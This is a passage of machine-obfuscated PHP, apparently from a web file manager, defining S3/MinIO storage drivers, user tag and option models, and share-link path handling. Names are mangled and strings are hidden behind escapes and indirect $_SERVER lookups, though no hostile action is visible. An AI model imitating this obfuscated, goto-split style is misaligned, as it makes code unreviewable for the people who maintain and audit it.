$Í÷ŠñŒ½) { continue; } $•÷ì¯Íö = isset($×¿Äğç½[$´ßåÑìÉ[76]]) ? $×¿Äğç½[$´ßåÑìÉ[76]] : 0; $Æİ§¾»  = $•÷ì¯Íö == 0 && substr($æÊ¨òúù, strlen($æÊ¨òúù) - 1, 1) == $´ßåÑìÉ[8] ? !0 : !1; $this->cacheMethodInfoSet($æÊ¨òúù, $Æİ§¾» , $×¿Äğç½); if ($Æİ§¾» ) { $ÁÚ£Èü¤[] = $æÊ¨òúù; continue; } $ÙšÙ‚³¼[] = $úÙ¦œú† ? $×¿Äğç½ : $æÊ¨òúù; } foreach ($Ş»ƒî–Š[$´ßåÑìÉ[205]] as $×¿Äğç½) { $ÁÚ£Èü¤[] = $×¿Äğç½[$´ßåÑìÉ[32]]; $this->cacheMethodInfoSet($×¿Äğç½[$´ßåÑìÉ[32]], !0); } $this->cacheMethodInfoSet($ŞĞä‘ö, !0); return array($´ßåÑìÉ[82] => $ÁÚ£Èü¤, $´ßåÑìÉ[83] => $ÙšÙ‚³¼); } private function listObjs($ÅŞ™ìÅ“, $õÃ­‰– = null, $Šà“¾Ç = null, $»åü—Ì× = null) { $€ÏÀÒ¬ =& $_SERVER[ùÆÎÔ“Ñ]; $ÅŞ™ìÅ“ = trim($ÅŞ™ìÅ“, $€ÏÀÒ¬[8]); $öÕö•³ = empty($ÅŞ™ìÅ“) && $ÅŞ™ìÅ“ !== $€ÏÀÒ¬[197] ? $€ÏÀÒ¬[12] : $ÅŞ™ìÅ“ . $€ÏÀÒ¬[8]; return $this->client->getBucket($this->bucket, $öÕö•³, $õÃ­‰–, $Šà“¾Ç, $»åü—Ì×, !0); } public function has($æğÍ¤°ú, $¨åß‹Ø• = false, $¼ıçŸ = true) { $¹í½…³‹ =& $_SERVER[ùÆÎÔ“Ñ]; $æğÍ¤°ú = trim($æğÍ¤°ú, $¹í½…³‹[8]); $à¾ÑÇñî = empty($æğÍ¤°ú) && $æğÍ¤°ú !== $¹í½…³‹[197] ? $¹í½…³‹[12] : $æğÍ¤°ú . $¹í½…³‹[8]; $ıËñ¨Ş¯ = null; $¨­âŒğ° = 500; $¯‡¦ğÎÚ = $¹í½…³‹[8]; $æÏÌïºÇ = $¶šøÊüù = array(); while (!0) { $òÖ°÷ú = $this->listObjs($æğÍ¤°ú, $ıËñ¨Ş¯, $¨­âŒğ°, $¯‡¦ğÎÚ); if (!$òÖ°÷ú) { break; } $ıËñ¨Ş¯ = $òÖ°÷ú[$¹í½…³‹[206]]; $æÍÎëÀ = $òÖ°÷ú[$¹í½…³‹[204]]; $ê•¦ÂÕÌ = $òÖ°÷ú[$¹í½…³‹[205]]; if (empty($æÍÎëÀ) && empty($ê•¦ÂÕÌ)) { break; } if (count($æÍÎëÀ) == 1 && $æÍÎëÀ[0][$¹í½…³‹[32]] == $à¾ÑÇñî) { break; } if ($¨åß‹Ø•) { if (count($æÍÎëÀ)) { $æÍÎëÀ = array_column($æÍÎëÀ, $¹í½…³‹[32]); $æÏÌïºÇ = array_merge($æÏÌïºÇ, $æÍÎëÀ); } if (count($ê•¦ÂÕÌ)) { $ê•¦ÂÕÌ = array_column($ê•¦ÂÕÌ, $¹í½…³‹[32]); $¶šøÊüù = array_merge($¶šøÊüù, $ê•¦ÂÕÌ); } if ($ıËñ¨Ş¯ === null) { break; } continue; } if ($¼ıçŸ) { if (!empty($æÍÎëÀ)) { if (count($æÍÎëÀ) > 1 || isset($æÍÎëÀ[0][$¹í½…³‹[32]]) && $æÍÎëÀ[0][$¹í½…³‹[32]] != $à¾ÑÇñî) { return !0; } } } else { if (!empty($ê•¦ÂÕÌ)) { return !0; } } if ($ıËñ¨Ş¯ === null) { break; } } if ($¨åß‹Ø•) { $æÏÌïºÇ = array_diff($æÏÌïºÇ, array($à¾ÑÇñî)); $æÏÌïºÇ = count(array_unique($æÏÌïºÇ)); $¶šøÊüù = count(array_unique($¶šøÊüù)); return array($¹í½…³‹[207] => $æÏÌïºÇ, $¹í½…³‹[208] => $¶šøÊüù); } return !1; } public function listAll($í­Â¡•Ğ) { $Âáİœ…µ =& $_SERVER[ùÆÎÔ“Ñ]; $ÒµÊö½¯ = $this->fileList($í­Â¡•Ğ, $Âáİœ…µ[12], !0); $áªÛ´ = array(); foreach ($ÒµÊö½¯[$Âáİœ…µ[83]] as $İïâ¹Š¦) { $áªÛ´[$İïâ¹Š¦[$Âáİœ…µ[32]]] = $İïâ¹Š¦[$Âáİœ…µ[76]]; } foreach ($ÒµÊö½¯[$Âáİœ…µ[82]] as $İïâ¹Š¦) { if (is_string($İïâ¹Š¦)) { $áªÛ´[$İïâ¹Š¦] = 0; } } return $this->listAllFiles($í­Â¡•Ğ, array_keys($áªÛ´), $áªÛ´); } public function canRead($œâ¦À—ş) { $ü¯Úñ¿” =& $_SERVER[ùÆÎÔ“Ñ]; $‘ı¶ = $this->client->getAccessControlPolicy($this->bucket, $œâ¦À—ş); if (!$‘ı¶) { return !1; } return in_array($‘ı¶, array($ü¯Úñ¿”[209], $ü¯Úñ¿”[210], $ü¯Úñ¿”[211])) ? !0 : !1; } public function canWrite($¶†áäß®) { $µº¹·æ =& $_SERVER[ùÆÎÔ“Ñ]; $Â†Œ ¦è = $this->client->getAccessControlPolicy($this->bucket, $¶†áäß®); if (!$Â†Œ ¦è) { return !1; } return in_array($Â†Œ ¦è, array($µº¹·æ[209], $µº¹·æ[210])) ? !0 : !1; } public function getContent($°§Úò¦±) { return $this->client->getObject($this->bucket, $°§Úò¦±); } public function setContent($æÁ±§ˆú, $ŸÌõîÇ‘ = '', $Õ¸ŒŠØÏ = false) { $Õ²¿ê‰Œ =& $_SERVER[ùÆÎÔ“Ñ]; $æÁ±§ˆú = $Õ¸ŒŠØÏ ? trim($æÁ±§ˆú, $Õ²¿ê‰Œ[8]) . $Õ²¿ê‰Œ[8] : $æÁ±§ˆú; $§âÏÂ = get_file_mime(get_path_ext($æÁ±§ˆú)); $Ñ¡Æ¿È = $this->client->putObject($ŸÌõîÇ‘, $this->bucket, $æÁ±§ˆú, $Õ²¿ê‰Œ[198], array(), $§âÏÂ); if (!$Ñ¡Æ¿È) { return !1; } if ($Õ¸ŒŠØÏ) { return !0; } $this->cacheMethod(null, null); $Ñ¡Æ¿È = $this->copyFile($æÁ±§ˆú, $æÁ±§ˆú, array($Õ²¿ê‰Œ[212] => $Ñ¡Æ¿È[$Õ²¿ê‰Œ[213]])); return $Ñ¡Æ¿È ? !0 : !1; } public function fileSubstr($ğ”—¥ëÁ, $úÉ²‰¦, $¢’°ì¸À) { $€È·¸Û = $úÉ²‰¦ + $¢’°ì¸À - 1; return $this->client->getObject($this->bucket, $ğ”—¥ëÁ, array($_SERVER[ùÆÎÔ“Ñ][214] => "\142\171\x74\x65\x73\75{$úÉ²‰¦}\x2d{$€È·¸Û}")); } public function upload($ÑÁÇÇá›, $Ó˜‚à¨, $Ôö¹¾—Ş = false, $ã’¶ÊŠ = REPEAT_REPLACE) { $ÁÑŸíêç =& $_SERVER[ùÆÎÔ“Ñ]; $‰„ßÆ…Ò = array($ÁÑŸíêç[212] => @md5_file($Ó˜‚à¨)); $•º»ÒÎ¸ = array($ÁÑŸíêç[215] => get_file_mime(get_path_ext($ÑÁÇÇá›))); if (IO::size($Ó˜‚à¨) <= 1024 * 1024 * 200) { $«¬É®Ñ€ = $this->client->putObjectFile($Ó˜‚à¨, $this->bucket, $ÑÁÇÇá›, $ÁÑŸíêç[198], $‰„ßÆ…Ò, $•º»ÒÎ¸); return !empty($«¬É®Ñ€) ? $this->getPathOuter($ÑÁÇÇá›) : !1; } $ö½‘›ï = $this->client->multiUploadObject($Ó˜‚à¨, $this->bucket, trim($ÑÁÇÇá›, $ÁÑŸíêç[8]), $‰„ßÆ…Ò, $•º»ÒÎ¸); return $ö½‘›ï ? $this->getPathOuter($ÑÁÇÇá›) : !1; } public function download($•’ä®ì, $»øœâŞµ) { if (!@is_dir($this->pathFather($»øœâŞµ)) && !IO::mkdir($this->pathFather($»øœâŞµ))) { return !1; } $­²‰å™¯ = $this->client->getObject($this->bucket, $•’ä®ì, array(), $»øœâŞµ); return $­²‰å™¯ !== !1 ? $»øœâŞµ : !1; } public function link($ÄÀèù, $ûÉ»šïŞ = array()) { $ÑÚå›Ù² =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->signVer == $ÑÚå›Ù²[216]) { return $this->client->getAuthenticatedURL($this->bucket, $ÄÀèù, 3600 * 12, $ûÉ»šïŞ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÄÀèù, $ÑÚå›Ù²[8]), 3600 * 12, $this->region, array(), !0, $ûÉ»šïŞ); } public function fileOut($ĞÔÓ¤ìß, $øíª•­ = false, $ÀÚ×â€ = false, $­°ëç = '') { $ËîÁÉ“Ò =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ĞÔÓ¤ìß, $øíª•­, $ÀÚ×â€, $­°ëç); } if (!$ÀÚ×â€) { $ÀÚ×â€ = $this->pathThis($ĞÔÓ¤ìß); } $¡”û“ş« = get_file_mime(get_path_ext($ÀÚ×â€)); if ($¡”û“ş« == $ËîÁÉ“Ò[217]) { return parent::fileOut($ĞÔÓ¤ìß, $øíª•­, $ÀÚ×â€, $­°ëç); } $¸«ğğÚ = array($ËîÁÉ“Ò[218] => $¡”û“ş«); if ($øíª•­) { $¸«ğğÚ[$ËîÁÉ“Ò[219]] = $ËîÁÉ“Ò[220] . rawurlencode($ÀÚ×â€); } else { } $‡Õ­Ö¶ñ = $this->link($ĞÔÓ¤ìß, $¸«ğğÚ); $this->fileOutLink($‡Õ­Ö¶ñ); } public function fileOutServer($ÑµŒ±¹, $êñã²øø = false, $×³˜Á“Í = false, $˜äÜãü¹ = '') { parent::fileOut($ÑµŒ±¹, $êñã²øø, $×³˜Á“Í, $˜äÜãü¹); } public function fileOutImageServer($è€Øò¼, $ºó»ó•Ê = 250) { parent::fileOutImage($è€Øò¼, $ºó»ó•Ê); } public function hashMd5($Ã­‰Èœ¶, $øíœüö = '') { $ÛŸÃ‘İœ =& $_SERVER[ùÆÎÔ“Ñ]; $¡¢î”Ê = $this->objectMeta($Ã­‰Èœ¶); if (!$¡¢î”Ê) { return !1; } $øíœüö = $øíœüö ? $øíœüö : _get($¡¢î”Ê, $ÛŸÃ‘İœ[221]); $øíœüö = $øíœüö ? $øíœüö : _get($¡¢î”Ê, $ÛŸÃ‘İœ[213], $ÛŸÃ‘İœ[12]); return $øíœüö; } public function uploadFormData($ÉˆŠ€®Î, $¯¡÷ÑŞ© = 3600) { $Šû¡ÈşÕ =& $_SERVER[ùÆÎÔ“Ñ]; $ÒòÜµÃú = $this->pathFather($ÉˆŠ€®Î); $§³ë½Ö¦ = $this->client->getHttpUploadPostParams($this->bucket, $ÒòÜµÃú, $Šû¡ÈşÕ[198], $¯¡÷ÑŞ©); return array_merge((array) $§³ë½Ö¦, array($Šû¡ÈşÕ[181] => $this->getHost())); } public function multiUploadFormData($ãêÅ®•, $ä­¾óìæ = 3600) { $©¥Èïèğ =& $_SERVER[ùÆÎÔ“Ñ]; $ ŸÇ‡”Ç = gmdate($©¥Èïèğ[222]); $’§²½¾ = array(); $Ÿí€Ò´§ = $this->client->getUploadId($this->bucket, $ãêÅ®•, $’§²½¾); if (!$Ÿí€Ò´§) { return !1; } return array($©¥Èïèğ[223] => $Ÿí€Ò´§, $©¥Èïèğ[181] => $this->getHost() . $©¥Èïèğ[8] . $this->pathEncode($ãêÅ®•), $©¥Èïèğ[224] => $ ŸÇ‡”Ç, $©¥Èïèğ[94] => $ãêÅ®•); } public function multiUploadAuthData($èÎˆå´ˆ, $ú‹ ûÒ® = array()) { $è¦ñíÈ =& $_SERVER[ùÆÎÔ“Ñ]; $‹·ùƒ¡À = isset($ú‹ ûÒ®[$è¦ñíÈ[224]]) ? $ú‹ ûÒ®[$è¦ñíÈ[224]] : gmdate($è¦ñíÈ[222]); $Í¸²¶Ş = isset($ú‹ ûÒ®[$è¦ñíÈ[174]]) ? $ú‹ ûÒ®[$è¦ñíÈ[174]] : $è¦ñíÈ[12]; $÷œïŸÌ„ = $ú‹ ûÒ®[$è¦ñíÈ[94]]; unset($ú‹ ûÒ®[$è¦ñíÈ[94]]); if (isset($ú‹ ûÒ®[$è¦ñíÈ[225]])) { $ú‹ ûÒ®[$è¦ñíÈ[224]] = $‹·ùƒ¡À; return $this->listUploadParts($÷œïŸÌ„, $ú‹ ûÒ®); } $­ ô²ÈÎ = array($è¦ñíÈ[226], $è¦ñíÈ[12], $è¦ñíÈ[120], $è¦ñíÈ[12], "\x78\x2d\x61\x6d\172\x2d\144\x61\164\x65\x3a{$‹·ùƒ¡À}", $è¦ñíÈ[8] . $this->bucket . $è¦ñíÈ[8] . $this->pathEncode($÷œïŸÌ„) . $Í¸²¶Ş); if (strpos($Í¸²¶Ş, $è¦ñíÈ[227]) === 0) { $­ ô²ÈÎ[0] = $è¦ñíÈ[228]; } if (isset($ú‹ ûÒ®[$è¦ñíÈ[229]]) && $ú‹ ûÒ®[$è¦ñíÈ[229]] == $è¦ñíÈ[230]) { $­ ô²ÈÎ[0] = $è¦ñíÈ[230]; } $šòõ²úÈ = implode($è¦ñíÈ[231], $­ ô²ÈÎ); $ƒ±Œ’ßï = base64_encode(hash_hmac($è¦ñíÈ[232], $šòõ²úÈ, $this->secret, !0)); $Éüµ‘õµ = $è¦ñíÈ[233] . $this->accessKey . $è¦ñíÈ[4] . $ƒ±Œ’ßï; if (strpos($Í¸²¶Ş, $è¦ñíÈ[227]) === 0) { return array($è¦ñíÈ[234] => $Éüµ‘õµ, $è¦ñíÈ[224] => $‹·ùƒ¡À); } return $Éüµ‘õµ; } public function listUploadParts($ƒÌöóø‘, $ŸÅªÔ€ = array()) { $óğí‚š =& $_SERVER[ùÆÎÔ“Ñ]; $·“ù Ãù = str_replace($óğí‚š[235], $óğí‚š[12], $ŸÅªÔ€[$óğí‚š[174]]); $ã§Ò‡† = $this->client->listParts($this->bucket, $ƒÌöóø‘, $·“ù Ãù); if (!$ã§Ò‡†) { return !1; } unset($ŸÅªÔ€[$óğí‚š[225]], $ŸÅªÔ€[$óğí‚š[229]]); $ŸÅªÔ€[$óğí‚š[94]] = $ƒÌöóø‘; $çı§ïÚ± = $this->multiUploadAuthData($ƒÌöóø‘, $ŸÅªÔ€); if (empty($çı§ïÚ±)) { return !1; } return array($óğí‚š[234] => $çı§ïÚ±, $óğí‚š[224] => $ŸÅªÔ€[$óğí‚š[224]], $óğí‚š[236] => $ã§Ò‡†); } public function getHost() { return parent::getHost() . $_SERVER[ùÆÎÔ“Ñ][8] . $this->bucket; } public function size($ŸÑÏÑò¸) { $ª£íÒ« = $this->objectMeta($ŸÑÏÑò¸); return $ª£íÒ« ? $ª£íÒ«[$_SERVER[ùÆÎÔ“Ñ][76]] : 0; } public function info($ şÅ§ï) { if ($this->isFolder($ şÅ§ï)) { return $this->folderInfo($ şÅ§ï); } else { if ($this->isFile($ şÅ§ï)) { return $this->fileInfo($ şÅ§ï); } } return !1; } public function exist($“«ŒëØç) { return $this->isFile($“«ŒëØç) || $this->isFolder($“«ŒëØç); } public function isFile($ŒÀİËª) { return !$this->isFolder($ŒÀİËª) && $this->objectMeta($ŒÀİËª); } public function isFolder($ÚïºïÃœ) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][165], $ÚïºïÃœ); } protected function objectMeta($ò¢È¬À¶) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][167], $ò¢È¬À¶); } protected function _objectMeta($¤éŒ¡‡) { $¾°êÊ¿™ =& $_SERVER[ùÆÎÔ“Ñ]; $¤éŒ¡‡ = rtrim($¤éŒ¡‡, $¾°êÊ¿™[8]); try { $ı×®£İ‚ = $this->client->getObjectInfo($this->bucket, $¤éŒ¡‡); if (!isset($ı×®£İ‚[$¾°êÊ¿™[221]]) && isset($ı×®£İ‚[$¾°êÊ¿™[237]])) { $ı×®£İ‚[$¾°êÊ¿™[221]] = $ı×®£İ‚[$¾°êÊ¿™[237]]; } } catch (Exception $È§µ®º­) { $ı×®£İ‚ = !1; } if (!$ı×®£İ‚) { } return $ı×®£İ‚; } protected function _isFolder($ÚÅ¬–í’) { $¦‚ƒÇŞä =& $_SERVER[ùÆÎÔ“Ñ]; $ÚÅ¬–í’ = rtrim($ÚÅ¬–í’, $¦‚ƒÇŞä[8]); if ($ÚÅ¬–í’ == $¦‚ƒÇŞä[12] || $ÚÅ¬–í’ == $¦‚ƒÇŞä[8]) { return !0; } $¨ƒ›üúÜ = $this->client->getBucket($this->bucket, $ÚÅ¬–í’, null, 1); if (empty($¨ƒ›üúÜ[$¦‚ƒÇŞä[204]])) { return !1; } $ÛØ«‘Âƒ = $¨ƒ›üúÜ[$¦‚ƒÇŞä[204]][0][$¦‚ƒÇŞä[32]]; return stripos($ÛØ«‘Âƒ, $ÚÅ¬–í’ . $¦‚ƒÇŞä[8]) === 0 ? !0 : !1; if (substr($ÛØ«‘Âƒ, -1) == $¦‚ƒÇŞä[8]) { return !0; } if (get_path_this($ÛØ«‘Âƒ) == get_path_this($ÚÅ¬–í’)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($íÕ©ããï) { parent::__construct($íÕ©ããï); $this->signatureVersion($_SERVER[ùÆÎÔ“Ñ][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto dÑŞ×»¤Í£; d±™ÑÆ²…: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\x6f\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ûİ¯í) { $™µÏµË® =& $_SERVER[ùÆÎÔ“Ñ]; if (!defined($™µÏµË®[475])) { define($™µÏµË®[475], 0); } return "\x55\163\x65\162\117\160\164\x69\x6f\156\x5f{$ûİ¯í}\137" . USER_ID; } protected function filterWhere($Ş¹õ ¼) { $Ö…„à =& $_SERVER[ùÆÎÔ“Ñ]; if (!defined($Ö…„à[475])) { define($Ö…„à[475], 0); } $Ş¹õ ¼[$Ö…„à[1667]] = USER_ID; return $Ş¹õ ¼; } public function cacheRemoveUser($ŸûÍ¥óŠ, $üÃ‚¯ó) { return Cache::remove("\125\x73\145\162\117\160\164\x69\157\x6e\x5f{$ŸûÍ¥óŠ}\x5f" . $üÃ‚¯ó); } protected function optionDefault($­Ê¬„–Ş = '') { $æ¸Ô¾ó =& $_SERVER[ùÆÎÔ“Ñ]; if ($­Ê¬„–Ş == $æ¸Ô¾ó[12]) { return $GLOBALS[$æ¸Ô¾ó[6]][$æ¸Ô¾ó[2344]]; } if ($­Ê¬„–Ş == $æ¸Ô¾ó[2345]) { return $GLOBALS[$æ¸Ô¾ó[6]][$æ¸Ô¾ó[2346]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\x74\141\x67\114\151\163\x74"; public $modelType = "\125\x73\145\x72\117\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\141\155\x65", "\163\164\x79\x6c\145", "\x73\x6f\162\164"); public function listData($ù§ÇŞªæ = false, $ìªë‚†­ = "\163\157\162\x74", $ÁÀÄë«Ï = false) { return parent::listData($ù§ÇŞªæ, $ìªë‚†­, $ÁÀÄë«Ï); } public function remove($÷—‡İî) { return parent::remove($÷—‡İî); } public function add($ƒ»¥–ÛŒ, $öâ¡ˆÃ = "\154\141\x62\145\x6c\x2d\147\x72\145\171\x2d\156\x6f\x72\x6d\x61\x6c") { $¯úÌ•à =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->findByName($ƒ»¥–ÛŒ)) { return !1; } $İô±‚È“ = array($¯úÌ•à[420] => $ƒ»¥–ÛŒ, $¯úÌ•à[485] => $öâ¡ˆÃ, $¯úÌ•à[1861] => $this->getSort($¯úÌ•à[258]) + 1); return parent::insert($İô±‚È“); } public function update($¤½û€Ó’, $öœõ¡ä¡) { $¿ãÔ î =& $_SERVER[ùÆÎÔ“Ñ]; $²±„ • = $this->listData($¤½û€Ó’); $¤ÃËØ = $this->findByName($öœõ¡ä¡[$¿ãÔ î[32]]); if (!$²±„ • || $¤ÃËØ && $¤ÃËØ[$¿ãÔ î[399]] != $²±„ •[$¿ãÔ î[399]]) { return !1; } return parent::update($¤½û€Ó’, $öœõ¡ä¡); } public function moveTop($İáÃ¯ÉÁ) { $Úİë˜œ® =& $_SERVER[ùÆÎÔ“Ñ]; $Ë©Ç‚ó” = parent::listData(); $¸°ŞÇ—‘ = $this->getSort($Úİë˜œ®[257]); foreach ($Ë©Ç‚ó” as &$×¡ÍØ‘) { if ($×¡ÍØ‘[$Úİë˜œ®[399]] == $İáÃ¯ÉÁ) { $×¡ÍØ‘[$Úİë˜œ®[1881]] = $¸°ŞÇ—‘; continue; } $×¡ÍØ‘[$Úİë˜œ®[1881]] += 1; } unset($×¡ÍØ‘); return parent::resetData($Ë©Ç‚ó”); } public function moveBottom($†Óúö¸ğ) { $ë†°¹¬ =& $_SERVER[ùÆÎÔ“Ñ]; $ºÂş¸ = $this->getSort($ë†°¹¬[258]) + 1; return parent::update($†Óúö¸ğ, array($ë†°¹¬[1881] => $ºÂş¸)); } public function resetSort($¹îî¬) { $¸ÓîÈ«¾ =& $_SERVER[ùÆÎÔ“Ñ]; $í›¥²âª = array(); $¹îî¬ = is_array($¹îî¬) ? $¹îî¬ : array(); for ($Å¸·Ñğ = 0; $Å¸·Ñğ < count($¹îî¬); $Å¸·Ñğ++) { $í›¥²âª[$¹îî¬[$Å¸·Ñğ] . $¸ÓîÈ«¾[12]] = $Å¸·Ñğ + 1; } $Ô†½–õ = parent::listData(); foreach ($Ô†½–õ as &$Ü­ãğÒ) { $ù¦Ä¯¸ˆ = $í›¥²âª[$Ü­ãğÒ[$¸ÓîÈ«¾[399]]]; $Ü­ãğÒ[$¸ÓîÈ«¾[1881]] = $ù¦Ä¯¸ˆ ? $ù¦Ä¯¸ˆ : $Ü­ãğÒ[$¸ÓîÈ«¾[1881]]; } unset($Ü­ãğÒ); return parent::resetData($Ô†½–õ); } private function getSort($ô„‰›•â) { $¢ÚğÓ€¯ =& $_SERVER[ùÆÎÔ“Ñ]; $‡ëÑ”ıê = parent::listData(); $§æ©ñµé = array_to_keyvalue($‡ëÑ”ıê, $¢ÚğÓ€¯[12], $¢ÚğÓ€¯[1881]); if (!$§æ©ñµé) { $§æ©ñµé = array(0); } $ŸÊêóé± = $ô„‰›•â == $¢ÚğÓ€¯[258] ? max($§æ©ñµé) : min($§æ©ñµé); return intval($ŸÊêóé±); } } goto Cê¯ŒÛË„Ï; dØ‹–§—“¶: define($_SERVER[ùÆÎÔ“Ñ][241], 1); define($_SERVER[ùÆÎÔ“Ñ][242], 0); define($_SERVER[ùÆÎÔ“Ñ][243], 2); goto BÚËñ´Ã“; a¦ùº¦½é: class PathDriverDbShareLink extends PathDriverDB { public function __construct($š½±’ìƒ) { $this->pathParse = $š½±’ìƒ; $this->model = Model($_SERVER[ùÆÎÔ“Ñ][1341]); } protected function infoParse($ƒ™Ê×ê, $ğí¬  = false, $ºæìä›¾ = false) { $ç§ù½Óş =& $_SERVER[ùÆÎÔ“Ñ]; return Action($ç§ù½Óş[1180])->sharePathInfo($this->pathParse[$ç§ù½Óş[84]], !0, $ğí¬ ); } public function listPath($¾´¨¾ú±, $¨»ğû—À = false) { $¦ÁÈºŸó =& $_SERVER[ùÆÎÔ“Ñ]; $—©›¹¼À = parent::listPath($¾´¨¾ú±, $¨»ğû—À); if (!$—©›¹¼À) { return $—©›¹¼À; } if (is_array($—©›¹¼À[$¦ÁÈºŸó[1350]])) { $—©›¹¼À[$¦ÁÈºŸó[1350]] = Action($¦ÁÈºŸó[1180])->shareItemInfo($—©›¹¼À[$¦ÁÈºŸó[1350]]); } foreach ($—©›¹¼À as $Õ¾ìÒí => $°ŸÖ€üõ) { if (!in_array($Õ¾ìÒí, array($¦ÁÈºŸó[83], $¦ÁÈºŸó[82]))) { continue; } foreach ($°ŸÖ€üõ as $¯Ø˜¬Â => $‡…«Ú†‰) { $—©›¹¼À[$Õ¾ìÒí][$¯Ø˜¬Â] = Action($¦ÁÈºŸó[1180])->shareItemInfo($‡…«Ú†‰); } } return $—©›¹¼À; } public function listAll($§äï–·¥) { $É³Å®‰ƒ =& $_SERVER[ùÆÎÔ“Ñ]; $ô§ÈÊô = IO::info($this->pathParse[$É³Å®‰ƒ[84]]); if (!$ô§ÈÊô) { return array(); } $¢ğãµï® = $this->model->listAll($§äï–·¥); foreach ($¢ğãµï® as &$ÑÊ ÷ÃÕ) { $ÑÊ ÷ÃÕ[$É³Å®‰ƒ[86]] = Action($É³Å®‰ƒ[1180])->shareItemInfo($ÑÊ ÷ÃÕ[$É³Å®‰ƒ[86]]); } unset($ÑÊ ÷ÃÕ); return $¢ğãµï®; } } class PathDriverDriverShareItem { public function __construct($¡§³Úî†) { $this->pathParse = $¡§³Úî†; } public function __call($¢ÌóÂÀÍ, $¢ª¿Ã¿) { $šê«ğ¬ç =& $_SERVER[ùÆÎÔ“Ñ]; if (method_exists($this, $¢ÌóÂÀÍ)) { return; } $¿†«» = call_user_func_array(array($šê«ğ¬ç[1351], $¢ÌóÂÀÍ), $¢ª¿Ã¿); $ú’âúÂ§ = array($šê«ğ¬ç[1352], $šê«ğ¬ç[1353], $šê«ğ¬ç[1354], $šê«ğ¬ç[1355], $šê«ğ¬ç[555], $šê«ğ¬ç[557], $šê«ğ¬ç[1356], $šê«ğ¬ç[107], $šê«ğ¬ç[1357], $šê«ğ¬ç[1358]); if (in_array($¢ÌóÂÀÍ, $ú’âúÂ§)) { $¿†«» = $this->getPathOuter($¿†«»); } return $¿†«»; } public function copy($’¶â’à, $ÊôŞÉà, $¾³âö™¬ = false, $¾È²ß»¬ = false) { return $this->copyMove($’¶â’à, $ÊôŞÉà, $¾³âö™¬, $_SERVER[ùÆÎÔ“Ñ][555], $¾È²ß»¬); } public function move($èîä¼®™, $ºÉÂº½É, $Ì…‡é = false, $äôûğäÃ = false) { return $this->copyMove($èîä¼®™, $ºÉÂº½É, $Ì…‡é, $_SERVER[ùÆÎÔ“Ñ][557], $äôûğäÃ); } private function copyMove($ñŸéú«Ğ, $¾ŸŒƒ†, $‹ºÍ¿Ö», $Óàªç, $î¿ù©ƒ  = false) { $„ºŠ³É² =& $_SERVER[ùÆÎÔ“Ñ]; $°Ê¤ã‘ = $¾ŸŒƒ†; $ª»ÑÚˆÔ = IO::driverMake($¾ŸŒƒ†); if ($ª»ÑÚˆÔ->pathParse[$„ºŠ³É²[1156]]) { $¾ŸŒƒ† = $ª»ÑÚˆÔ->pathParse[$„ºŠ³É²[1156]]; } else { $¾ŸŒƒ† = $°Ê¤ã‘; } $ñü§¨ïŒ = IO::copyMove($ñŸéú«Ğ, $¾ŸŒƒ†, $‹ºÍ¿Ö», $Óàªç, $î¿ù©ƒ ); $ñü§¨ïŒ = $this->getPathOuter($ñü§¨ïŒ); return $ñü§¨ïŒ; } public function pathThis($ç´îµê¨) { return get_path_this($this->pathParse[$_SERVER[ùÆÎÔ“Ñ][84]]); } public function pathFather($ÁĞşàö´) { return get_path_father($this->pathParse[$_SERVER[ùÆÎÔ“Ñ][84]]); } public function iconvSystem($Òµ„•±ª) { return $Òµ„•±ª; } protected function infoParse($£°–¥ã¶, $¾åç¯ˆİ = false) { $¢ àôô =& $_SERVER[ùÆÎÔ“Ñ]; $ü®İ·°İ = $this->pathParse[$¢ àôô[487]][$¢ àôô[1181]] . $this->pathParse[$¢ àôô[1174]]; if ($¾åç¯ˆİ) { $œÆƒ­Ñâ = IO::infoWithChildren($ü®İ·°İ); } else { $œÆƒ­Ñâ = IO::info($ü®İ·°İ); } $İ¼ıöÈÉ = $this->pathParse[$¢ àôô[487]]; return Action($¢ àôô[1349])->_shareItemeParse($œÆƒ­Ñâ, $İ¼ıöÈÉ); } public function listAll($€Ÿ¢š¹‰) { $˜‘İ‰®û =& $_SERVER[ùÆÎÔ“Ñ]; $ÅêõêÃŞ = IO::listAll($€Ÿ¢š¹‰); $ö¾”¤Çƒ = $this->pathParse[$˜‘İ‰®û[487]]; foreach ($ÅêõêÃŞ as &$¯ÒõŠˆ) { check_abort(); $¸ÊŞŒ = IO::info($¯ÒõŠˆ[$˜‘İ‰®û[84]]); $¸ÊŞŒ = is_array($¸ÊŞŒ) ? $¸ÊŞŒ : array(); $¯ÒõŠˆ = array_merge($¸ÊŞŒ, $¯ÒõŠˆ); $¯ÒõŠˆ[$˜‘İ‰®û[86]] = Action($˜‘İ‰®û[1349])->_shareItemeParse($¯ÒõŠˆ, $ö¾”¤Çƒ); } unset($¯ÒõŠˆ); return $ÅêõêÃŞ; } public function getPathOuter($³À çÑÙ) { $¼ÄÊü©Ò =& $_SERVER[ùÆÎÔ“Ñ]; $éÉ†’é¦ = KodIO::parse($³À çÑÙ); if ($éÉ†’é¦[$¼ÄÊü©Ò[33]] == KodIO::KOD_SHARE_ITEM) { return $éÉ†’é¦[$¼ÄÊü©Ò[84]]; } $ÃœÈªÈÚ = KodIO::clear($³À çÑÙ); $¢ÖĞóûË = KodIO::clear($this->pathParse[$¼ÄÊü©Ò[487]][$¼ÄÊü©Ò[1181]]); $–¿ò¯Ù¹ = substr($ÃœÈªÈÚ, strlen($¢ÖĞóûË)); if (substr($ÃœÈªÈÚ, 0, strlen($¢ÖĞóûË)) != $¢ÖĞóûË) { return !1; } return $this->pathParse[$¼ÄÊü©Ò[1175]] . $¼ÄÊü©Ò[8] . ltrim($–¿ò¯Ù¹, $¼ÄÊü©Ò[8]); } public function getType() { $êÑ·±îÖ =& 